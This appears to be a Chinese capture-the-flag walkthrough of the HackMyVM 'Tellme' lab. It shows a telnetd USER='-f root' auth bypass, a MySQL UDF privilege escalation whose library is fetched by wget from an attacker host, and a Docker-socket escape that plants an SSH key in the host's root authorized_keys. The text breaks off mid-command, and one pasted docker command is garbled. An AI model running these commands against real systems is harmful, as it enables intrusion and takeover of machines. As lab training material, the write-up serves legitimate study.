---
title: HackMyVm靶场之Tellme.
url: https://mp.weixin.qq.com/s/ogHHqsz2D1JAVeUjB9y9HQ
source: Doonsec's feed
date: 2026-06-20
fetch_date: 2026-06-21T06:46:48.320822
---

# HackMyVm靶场之Tellme.

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/8avkpGSKmqdQSZ7IZTu1UtV8fDc9hYETVQ6qeV2Unxzr99J3V0x3fUGujbt9NicUibGlEVBXBiajMSyAt2eiaHtBJsrFd9Ax11c4ibRWJFNz14iag/0?wx_fmt=jpeg)

# HackMyVm靶场之Tellme.

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

Sublarge佬的靶机

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfnM5eibXzoyWpQqibv04Xa0sYMwBhNXCyk1oJKiaIfURQKic6FqpdkWh9Un98xOlU1WwteRJQibFQw3ScJ1NjjoALCBSSPg5QYWbd4/640?wx_fmt=png&from=appmsg)

一.信息收集

1.IP地址

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqc30iaIUkLvfjPueoRVWicd6BrWwInTuibj9yKf0KjLCVpUpsEIdhtTWb4fp99RicuiaOK6yzk1sERe05Pic2R0Qq1MpaBpkhxic6kaao/640?wx_fmt=png&from=appmsg)

IP是192.168.222.138

2.端口扫描

```
rustscan -a 192.168.222.138
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdJVA5LnX47j4GqYmUSRPfmTKQxGexLwUiczBbCpTicoOqoy9ZIRjSOYBcjtny05GFLP8LYSRAHbNcUIe3Lt9BAtl0McpaMHHHzE/640?wx_fmt=png&from=appmsg)

我们可以看到端口有22,80,2323,8500端口，我们去看看。

这里目录扫描没有任何的东西。

二.访问IP

```
http://192.168.222.138/
```

80端口没有任何的信息

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdUP4K1piaFhEaH9A1R0r2PIfckWiaHgpALyJgG1lEVt8xSNGic87hywNOSYrAZ0gAk0IPPE7XtdC0RrFA9IwzeRvXGMAhKarAEGo/640?wx_fmt=png&from=appmsg)

```
http://192.168.222.138:8500/ui/dc1/kv/mysql/config/root_pass/edit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdQrLo0sGPvHdOS615bJIt7fOTT9696wSgJWQuvsY9f14iaibgGYicVA3ZAftUibrIyC24icibV879OZtf9YCA0mABuJXhnuKep2QfLY/640?wx_fmt=png&from=appmsg)

我们在8500端口发现了mysql数据库的密码是TellMeYouLoveMe，用户名是root,目前我们没有使用的端口是2323，所以接下来我们的思路就是去2323端口看看有没有什么信息了。

三.渗透测试

1.2323端口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcickPC8rKXYXMH2SQ1zicOKrBJKK2waW85dRLbtcvQAOUbxDUAPaXVtAzzpcDRkiaiaAtjqtCUCOIhpCe9YYAkQ80ONiaHphGLmTw8/640?wx_fmt=png&from=appmsg)

```
https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/os/GNU-InetUtils-telnetd-%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2026-24061.md
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqc8QnwR3tbibnicMoBcRJ1HBIQmMaZDGCzBcjWY7T96V0gcaEtHpjicZ49oaCZOAsAHt1qLblPSvNPCNeZuC0AADIMIzb39hphLia0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqe0NkxEvtOXhKibOpK8XLMy4RPhfLYcZKw3d7vS9wNdqr838s0kicVXvm40Q4Zb1ENkGklxgB9EtibhDVBcLpu3zFQKXakJp2DsB8/640?wx_fmt=png&from=appmsg)

我们去使用这个命令试试看

```
USER="-f root" telnet -a 192.168.222.138 2323
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfhV5lIxxXBCwMIkEOddb2LYowGhks9acYEdu5h08pnjfrQTHhQThLwcyCj5G08d9Ej7RgkoYbhE9LB2tm45VkOiaSc8NhWQmHk/640?wx_fmt=png&from=appmsg)

我们可以看到利用成功的，记住USER一定要大写的，不然是连接不成功的。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqerIolz8xibhAXM0O9b6Br8xgYegAzLGG7FSjHDzW9ibOatFdmulPQUcoakRsNzyfgicz794a8echeWEYTyg4YfoqcGr30LWEQZyI/640?wx_fmt=png&from=appmsg)

当你看到这两个信息的时候，你就需要知道你是在docker容器里面了，我们去寻找一下user.txt，发现home目录下是没有的，那么我们使用find命令去寻找即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqea5TeQV8LOrgrPdvJpRkc0WiaYvL5gFazpJ8fd71AOh9xYsicZ05XZMuZkREsHVqBic4HL8ichvfExgKxGM7Aa3TaMDASknAjwWL4/640?wx_fmt=png&from=appmsg)

可以看到user.txt,在/mnt/里面的

2.docker环境

既然，我们知道是在docker里面，那么我们去看看IP和端口什么的

没有发现好多工具都是没有的，我们需要去下载的

wget unzip  iproute2  fscan等等

我们去看看IP。可以看到是172.20.0.10

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeQwPb8nCAHG1gzibMmYEX2D094Eo3b6KgJbvoz2BoFp4ZFMcPN5umzrECIbA47urUyvQcFFiaZVibjGc2DRECf7X8D2cicPDTGibto/640?wx_fmt=png&from=appmsg)

看到这是一个内网，所以我们需要去使用fscan工具去扫描，看看还有没有其他的IP

```
./fscan_2.1.3_linux_x64 -h 172.20.0.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfnCX0bORicloGQ70xGkgxrhcd7TRBESElTxsq5LO72ciazXtTaJHBDPtzgyoJuXrAPLVsuTnOZ9mOia1OL2Biaeobh3x1TrpVuWPc/640?wx_fmt=png&from=appmsg)

OK，可以看到172.20.0.30，有一个3306端口，而且之前我们在8500端口上面发现了数据库的密码是TellMeYouLoveMe

我们去登录试试看

3.数据库

```
mysql -h 172.20.0.30 -uroot -p
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdI312QbYia7on0Xr2FaeYrJtYAVe2qZxAN5ahL6PpRcTbfYey4jKH0pQdiaB4xzetAUlbNaMTplQ3RhnOTSd4R0vbHiamKycaMk8/640?wx_fmt=png&from=appmsg)

我们可以看到登录成功的，我们去看看

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqd2ynt7FSOy5NEy0ckialEnsYiaicW8sWOtOia4Vs3CLMxkOhSveaKsnASoYicPjx8fNOQQ0nkNPE10Itiaj4iciaqe4eBkJ89xCkJWVyk/640?wx_fmt=png&from=appmsg)

我们可以看到表是空的，目前没有没有其他信息了，我们只能在mysql里面下手了，既然是mysql，那么我们可以试试mysql提权里面的udf提权

4.udf提权

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqe7Kiaibia2nkGVO8HDtRicoZBGvrRT44UPkZibkvp6aTib5GVOMgpgTbQdcRfVUSianR5UBM5UpPmnicPtrNO6MRz5WvLjAhGf7fkyians/640?wx_fmt=png&from=appmsg)

**身份权限**：`USER()`和`CURRENT_USER()`都显示为`root`且 `CURRENT_USER()`带有 `%`（代表允许远程登录），确认拥有 MySQL 最高权限。

**导出路径**：`secure_file_priv`的值为空，这意味着MySQL允许你使用 `INTO DUMPFILE`向任意绝对路径写入文件。

**插件目录**：`plugin_dir`指向 `/usr/lib64/mysql/plugin/`。这是 Linux 系统（特别是 CentOS/RHEL 及其衍生版）非常标准的插件目录路径。

**结论**：条件完美，可以直接开始提权操作。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfR4WXFzZjFcgFd3N9Paw2qAyvK4FtkhgalB0EYGRUR6M7o8jGhNxQ8T4p55Re7ibcakDlf6Kj67YDAYS04wHibp8L411yiaKqXNs/640?wx_fmt=png&from=appmsg)

#### 第一步：准备 UDF 动态库文件

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfGsNYwYZPbfdCn3yGaNQb7dxPGApbUc3JDUU29yBsqdZc1M0s2P83j3TYAb0ySgVvHIkC534pvzIMicxdPmjuD29jGPX42yI5s/640?wx_fmt=png&from=appmsg)

#### 第二步：将 .so 文件传输到目标机

```
wget http://192.168.137.57/lib_mysqludf_sys_64.so -O /tmp/lib_mysqludf_sys_64.so
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqc2gPvBosgE8OpkMs0baLCeXkCyWNzmQbsdXjJFmmYsghjjd0ib6ZyRuZiazlzEzv2ENico6IZiaLYxbCevMCE0icicMTEvsSNLWmITE/640?wx_fmt=png&from=appmsg)

#### 第三步：在 MySQL 中写入动态库

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcLSt8FJ62HhWHlia3hQHrE7aoVX4FNfYtXYlGulia4bwM0lyicSndB7sQbUd2ias1IluAEkh3fpjvSlpSpZjvZJ8wwicJ1LIW0lNyQ/640?wx_fmt=png&from=appmsg)

#### 第四步：创建自定义函数 (Create Function)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdcQG10GXLjtFg9AicZiaagQdrl7KibXmLCRY5YGjgxqQ5fRGSWHZUU9eLrOSfXHC1lApFGgla9TfPyBYydWYfhNK8vNH56Hmib2q4/640?wx_fmt=png&from=appmsg)

#### 第五步：执行系统命令

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdWJ5wN8ozmPI5XPVBibdKHSzzM6LSYGWDzhGEeD66icdakUp6ruOBFep1Zs3P8YiaXt7StYP1oMmY2FbC8LgfeiaaemCo2dxLaIPk/640?wx_fmt=png&from=appmsg)

我们可以看到是反弹成功的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdnH8AqjywYy7WRd4qsVEYUkSS7ChciajWb0YqpZEUue6yBx8hlF4Acuiby54ZuHibicGmqUnO7Fwyhn2nVL3nBJELkplVgEsGHWd4/640?wx_fmt=png&from=appmsg)

5.写入公钥

我们可以看到docker\_host的，那么我们可以去写入公钥，然后去登录root用户

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfTicbPfWsdtFicEFCKZ14adoEKrJ4X6qL8SdAicS1zc66e3f8WPZSXV0rqX8o8W04OywENfrsEymQKZA0bwRhCRTSsWuJ082nmh0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfv9OmIKmCiccfgpTOKW3bIOmKgLtyEgZcS7QNVTzRia6YThzcL1fUgWwm1XaEicJMvMaBHsVDP81mentpMibibL1BwydmP8c1oIa9o/640?wx_fmt=png&from=appmsg)

```
docker run -it --rm \  -v /root/.ssh:/host/root/.ssh \  alpine sh -c 'mkdir -p /host/root/.ssh && echo "ssh-rsdocker run -it --rm \> a AAAAB3NzaC1yc2EAAAADAQABAAACAQCrsUcnqCq7UZcCRORpcVUlnnUiji3W1+gU2zRB2OHUrEXYi7HfL1VP2+1YpolKI6KAuyItbUHJ9ejnbSb6zydGM/zgXq/M9Z7GjAAPCi9f6ezIZcv57nGnppw81fX0FV7x8DuDSoQgjjCs1JbSd6Cfe/C48v1zceIRP8F1ny8OxJMm9D2j/yB6URCVX/TrJ8sk9ue8KA+qhLhSGytENTNOt3DMpHjuv8X+3fgm+4o2PjTqWa3zvmCrIv7zf8Jq5O04y7uvyIH7vK4WejdZ9GHZzXtOyCx3Ewpr7ZX3WDC6FmAx7v3OVfmhN9yBvVdigIkLgd0QZrHHXnkbzOxxnrISWYLnqRl2DExY5pLYIpkRsNC4JMJNhiFkyoglwaeSY8NCSl0lwA0lt/TVBqIGV/sB2p1u/xRhuyOjaS6aLc1HlfzItdguM75NnGkKTa4dnJuqxQCH7+0x0Nk6/eXU59qvEGc4Lsd/cg+Un9ZzEajF/CwuFzPHLkISld87svcR2KLftokIUPeThCUKcg/VjbbogXTd9J77f0xF14WQvIFIX0js4x5XWVohsWD1nbn22TqnU+IWy9JbPvS78Hjta6pjvnIwZk7zjWsloL5gg6rQUgo/T5wPgF8KClIhM1UfcuxqHaCGtL+Fa6CwLkx+5FyFBbDFi0yoMgM5pBp2+tgLTQ== root@kali" >> /host/root/.ssh/authorized_keys'  -v /root/.ssh:/host/root/.ssh \
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeaZZJO39bkpOrPCWtcG73ZTTe91Qib53luHNl5nOF9lcmp2ZYDWhTbashY3LgNywdPc83XHcQ2klRgH6yBvBfRnLPKpaOmmQiaA/640?wx_fmt=png&from=appmsg)

发现不行的，然后我们去创建一个容器

```
curl --unix-socket /var/run/docker.sock \  -X POST http://localhost/containers/create?name=escape \  -H "Content-Type: application/json" \  -d '{    "Image":"alpine",    "Cmd":["sh","-c","mkdir -p /host/root/.ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCrsUcnqCq7UZ...